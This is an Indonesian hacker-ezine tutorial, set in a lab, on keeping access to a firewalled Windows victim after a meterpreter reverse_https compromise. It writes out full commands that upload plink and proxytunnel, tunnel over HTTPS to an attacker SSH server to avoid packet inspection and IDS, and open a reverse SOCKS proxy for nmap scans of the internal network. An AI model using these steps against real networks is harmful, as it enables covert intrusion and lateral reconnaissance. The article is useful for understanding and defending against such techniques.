@@ -1,0 +1,131 @@
+ECHO MAGAZINE VOLUME XI, ISSUE XXVII, PHILE 0x03.TXT
+                               :|             ++           
+                     :~~/ .::/ :::| ,::\ >::> :| :::\ :~~/ 
+                     :::, `::\ :|:| `::/ <::< :| :|:| :::, 
+                                                                   
+
+     SSH tunneling magic
+     d.m0nk3y [at] echo [dot] or [dot] id
+
+
+
+-----| Pendahuluan
+
+Pada tulisan ini akan membahas tentang bagaimana exploitasi client side
+attack untuk mendapatkan akses kedalam internal network milik komputer
+korban. Ada banyak sekali cara dalam melancarkan client side attack,
+misalnya dengan memanfaatkan celah internet browser, java, maupun
+program yang berisikan payload yang kemudian melakukan reverse connect
+shell ke komputer hacker, dll. Artikel exploitasi client side yang
+terdahulu pernah di bahas oleh cyberheb [1] tentang exploitasi XSS yang
+berujung dengan mendapatkan shell milik korban. 
+
+Posisi komputer jaringan korban yang berada dibelakang firewall (NAT)
+dan rules filtering lainnya seperti port blocking kadang membuat kita
+kesulitan untuk melakukan maintain koneksi dengan korban. Untuk
+mensimulasikan semua itu, saya telah membangun sebuah lab pada komputer
+yang saya gunakan.
+
+-----| Scenario
+
+ ----------	          ----------	        --------
+| attacker | ------- | firewall | <------- | victim |
+ ----------	          ----------	        --------
+               allow outbound conn 80	     
+
+attacker telah mendapatkan akses shell milik korban melalui program
+yang berisikan payload reverse connection shell, korban menggunakan
+sistem operasi windows dan rules firewall pada network korban hanya
+memperbolehkan outbound connection pada port 80.
+
+Dalam melakukan penetrasi awal pada komputer korban, saya menggunakan
+metasploit meterpreter reverse_https sebagai shellcode yang telah
+dieksekusi pada komputer target. Outbound connection yang digunakan
+adalah port 80 dan melakukan reverse connect shell pada ip publik yang
+telah disiapkan dan dapat diakses oleh korban. Penggunaan reverse_https
+dikarenakan untuk mengantisipasi jika adanya deteksi dari IDS ataupun
+packet inspection.
+
+       -------------------------------------> 80
+ ----------            ----------           --------
+|  victim  | ------- | firewall | ------- | attacker |
+ ----------            ----------           --------
+
+-----| Problem Solving
+
+Dengan asumsi firewall pada jaringan korban tidak menerapkan packet
+inspection maka proses reverse ssh ke dalam box yang saya gunakan akan
+sangat mudah. Kita hanya perlu menggantikan port menjadi 80 pada ssh
+server. Sedangkan kita tidak tahu apakah di firewall tersebut
+menerapkan packet inspection atau tidak, oleh karena itu digunakan
+HTTPS tunneling untuk membypass packet inspection.
+
+Setelah mendapatkan akses shell milik korban dengan privilege SYSTEM,
+untuk melakukan penetrasi i selanjutnya dibutuhkan dua program untuk
+dijalankan pada komputer korban. Program tersebut adalah plink [2] dan
+proxytunnel [3]. Plink adalah program ssh client yang merupakan
+development dari putty, sedangkan proxytunnel adalah program untuk
+melakukan HTTP/HTTPS tunneling. Proxytunnel dibutuhkan untuk
+menghindari packet inspection ataupun IDS jika terpasang di dalam
+jaringan korban.
+
++------------------------------------
+| meterpreter> upload /opt/tools/plink.exe c:/Windows/System32/
+| meterpreter> upload -r /opt/tools/proxytunnel c:/Users/Administrators/
++------------------------------------
+
+Setelah program yang dibutuhkan terpasang di komputer korban, jalankan
+proxytunnel untuk melakukan tunneling over HTTPS pada port 80 untuk
+melakukan forwarding ke port 443 pada ssh server milik attacker, dan
+membuka port local 8080.
+
++------------------------------------
+| C:\Users\Administrator\proxytunnel> proxytunnel.exe -a 8080 -p proxy.labs.net:80 -d 10.10.10.7:443
++------------------------------------
+     --------------------------------> 80  ------------> 443
+ ----------        ----------        -------          ----------
+|  victim  |      | firewall |      | proxy |        | attacker |
+ ----------        ----------        -------          ----------
+    8080 
+
+Akan terhubung koneksi antara komputer korban, proxy server, dan ssh
+server attacker. Gunakan plink.exe untuk melakukan reverse ssh ke
+komputer ssh server yang telah terhubung melalui local port 8080.
+
++------------------------------------
+| C:\Users\Administrators> plink.exe -l unknown -pw 683dcbc167745a402a828953baec4c88
+127.0.0.1 -P 8080 -D 2121 -R 31337:127.0.0.1:2121
++------------------------------------
+Reverse ssh akan membuka port 31337 pada komputer ssh server, dan port
+2121 pada komputer korban. port 31337 lah yang nantinya akan digunakan
+sebagai SOCKS proxy untuk melakukan penetrasi pada jaringan korban.
+
+     --------------------------------> 80  -----------> 443
+ ----------        ----------        -------          ----------
+|  victim  |      | firewall |      | proxy |        | attacker |
+ ----------        ----------        -------          ----------
+    8080 ---------------------------------------------> 443
+    2121 <--------------------------------------------> 31337
+
+Pada komputer ssh server, diperlukan program bernama proxychain [4]
+untuk melakukan tunneling ke komputer korban. 
+
++------------------------------------
+| root@holybox~# echo socks4 127.0.0.1 31337 >> /etc/proxychain.conf
+| root@holybox~# proxychain nmap -sT -p80,8080,21,445,3389,22 192.168.2.0/24
++------------------------------------
+
+enjoy your time! :)
+
+-----| Referensi :
+http://ezine.echo.or.id/ezine22/e22-006.txt
+http://www.chiark.greenend.org.uk/~sgtatham/putty/download.html
+proxytunnel.sourceforge.net/
+http://proxychains.sourceforge.net/
+http://pauldotcom.com/2010/03/resilient-ssh-tunneled-meterpr.html
+
+-----| Greetz to:
+1. Allah SWT
+2. Echo|Staff: y3dips, lirva32, k159, az001, the_day, dll & echoers!
+3. RNDC: om sj, idslacker, ab71, hapis, dll
+4. anda!
